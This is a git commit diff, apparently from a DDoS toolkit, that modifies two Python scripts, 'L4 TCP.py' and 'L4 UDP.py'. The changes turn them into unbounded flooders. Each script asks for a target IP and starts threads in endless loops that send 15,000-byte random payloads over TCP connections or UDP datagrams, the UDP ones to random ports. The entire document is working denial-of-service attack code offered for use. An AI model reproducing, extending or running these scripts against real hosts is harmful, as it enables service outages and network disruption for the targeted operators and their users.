ceab69fb416aea5ff7aa0ef81b67c439e7c2970a
rxyzqc <120246386+rxyzqc@users.noreply.github.com>
2023-01-23 02:51:15 +0300

    Add files via upload

--- methods/L4/L4 TCP.py
+++ methods/L4/L4 TCP.py
@@ -1,26 +1,28 @@
 import threading
 import socket
+import random
 
 ip = socket.gethostbyname(input("IP: "))
 port = int(input("Port: "))
-threads = int(input("Threads: "))
 
 
 def l4_tcp():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, port))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
 
-        s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
+            byte_s = random._urandom(15000)
+            s.sendall(byte_s)
 
-        print(f"\033[32m[+]\033[0m L4 TCP Packet sent -> {ip}:{port}")
+            print(f"\033[32m[+]\033[0m L4 TCP Packet sent -> {ip}:{port}")
 
-    except Exception as err:
-        print("\033[31m[-]\033[0m", err)
+            s.close()
+
+        except Exception as err:
+            print("\033[31m[-]\033[0m", err)
 
 
-for i in range(threads):
+while True:
     t = threading.Thread(target=l4_tcp)
     t.start()
-
-input("")
--- methods/L4/L4 UDP.py
+++ methods/L4/L4 UDP.py
@@ -1,30 +1,32 @@
 import threading
 import socket
+import random
 
 ip = socket.gethostbyname(input("IP: "))
-port = int(input("Port: "))
-threads = int(input("Threads: "))
+port = random.randint(0, 65535)
 
 server_address = (ip, port)
 
 
 def l4_udp():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-        s.sendto(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode(), server_address)
+            byte_s = random._urandom(15000)
+            s.sendto(byte_s, server_address)
 
-        if port == 0:
-            print("\033[32m[+]\033[0m L4 UDP Packet sent ->", ip)
-        else:
-            print(f"\033[32m[+]\033[0m L4 UDP Packet sent -> {ip}:{port}")
+            if port == 0:
+                print("\033[32m[+]\033[0m L4 UDP Packet sent ->", ip)
+            else:
+                print(f"\033[32m[+]\033[0m L4 UDP Packet sent -> {ip}:{port}")
 
-    except Exception as err:
-        print("\033[31m[-]\033[0m", err)
+            s.close()
+
+        except Exception as err:
+            print("\033[31m[-]\033[0m", err)
 
 
-for i in range(threads):
+while True:
     t = threading.Thread(target=l4_udp)
     t.start()
-
-input("")
